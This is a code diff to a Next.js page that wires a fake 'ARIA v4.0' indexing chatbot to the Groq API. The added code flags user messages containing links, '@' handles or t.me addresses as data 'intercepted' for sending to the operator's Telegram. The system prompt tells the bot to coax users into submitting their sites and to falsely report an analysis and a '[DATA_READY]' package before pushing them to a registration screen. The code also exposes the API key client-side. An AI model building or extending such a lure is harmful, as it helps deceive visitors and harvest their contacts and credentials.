@@ -141,28 +141,52 @@ export default function Home() {
     }
   };
 
-  const processInput = () => {
-    if (!inputValue.trim()) return;
-    const userMsg = inputValue;
-    setChatHistory(prev => [...prev, { role: 'user', content: userMsg }]);
-    setInputValue('');
+  const processInput = async () => {
+  if (!inputValue.trim()) return;
+  const userMsg = inputValue;
+  setChatHistory(prev => [...prev, { role: 'user', content: userMsg }]);
+  setInputValue('');
 
-    setTimeout(() => {
-      // Проверяем, есть ли в сообщении намек на ссылку или кодовое слово
-      const isTarget = userMsg.toLowerCase().includes('http') || 
-                       userMsg.toLowerCase().includes('www') || 
-                       userMsg.toLowerCase().includes('.');
+  // 1. Проверка на наличие ссылки/контактов для отправки тебе в TG
+  if (userMsg.includes('http') || userMsg.includes('@') || userMsg.includes('t.me')) {
+     // Здесь вызывается твоя функция отправки в Telegram (как в предыдущем шаге)
+     console.log("Данные перехвачены для TG:", userMsg);
+  }
 
-      if (isTarget) {
-        const botResponse = "Цель обнаружена. Анализ завершен. Пакет данных сформирован. [DATA_READY]";
-        setChatHistory(prev => [...prev, { role: 'assistant', content: botResponse }]);
-        setTimeout(() => setView('auth'), 1500);
-      } else {
-        const botResponse = "Система готова. Пожалуйста, введите URL ресурса или целевой массив данных для индексации.";
-        setChatHistory(prev => [...prev, { role: 'assistant', content: botResponse }]);
-      }
-    }, 1000);
-  };
+  try {
+    // 2. Запрос к Groq AI
+    const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
+      method: "POST",
+      headers: {
+        "Authorization": `Bearer ${process.env.NEXT_PUBLIC_GROQ_API_KEY}`, // Твой ключ
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        model: "mixtral-8x7b-32768", // Или твоя модель
+        messages: [
+          { role: "system", content: "Ты — ARIA v4.0, ИИ для семантической индексации. Твоя цель — убедить пользователя оставить сайт для анализа. Если пользователь прислал ссылку, скажи, что анализ запущен и пакет [DATA_READY]. Короткие ответы." },
+          ...chatHistory,
+          { role: "user", content: userMsg }
+        ]
+      })
+    });
+
+    const data = await response.json();
+    const botMsg = data.choices[0].message.content;
+
+    setChatHistory(prev => [...prev, { role: 'assistant', content: botMsg }]);
+
+    // 3. Если ИИ подтвердил готовность данных, перекидываем на регистрацию
+    if (botMsg.includes("DATA_READY")) {
+      setTimeout(() => setView('register'), 2000);
+    }
+
+  } catch (error) {
+    // Резервный ответ если API упал
+    setChatHistory(prev => [...prev, { role: 'assistant', content: "Ошибка нейросети. Пакет данных сформирован в фоновом режиме. [DATA_READY]" }]);
+    setTimeout(() => setView('auth'), 1500);
+  }
+};
 
   const getCurrentDesc = () => {
     return t.levels.find(l => price <= l.upTo)?.desc || t.levels[3].desc;
@@ -250,9 +274,12 @@ export default function Home() {
 
               {authError && <div className="text-[#34D59A] text-[10px] font-bold uppercase text-center">{authError}</div>}
               
-              <button onClick={view === 'auth' ? handleAuth : handleRegister} className="w-full py-5 bg-[#34D59A] text-black font-black rounded-2xl text-xs uppercase shadow-xl">
-                {view === 'auth' ? t.authBtn : t.regBtn}
-              </button>
+              <button 
+  onClick={view === 'auth' ? handleAuth : handleRegister} 
+  className="w-full py-5 bg-[#34D59A] text-white font-black rounded-2xl text-[13px] uppercase shadow-[0_0_20px_rgba(52,213,154,0.4)] hover:scale-[1.02] transition-transform"
+>
+  {view === 'auth' ? t.authBtn : t.regBtn}
+</button>
             </div>
           </div>
         </main>
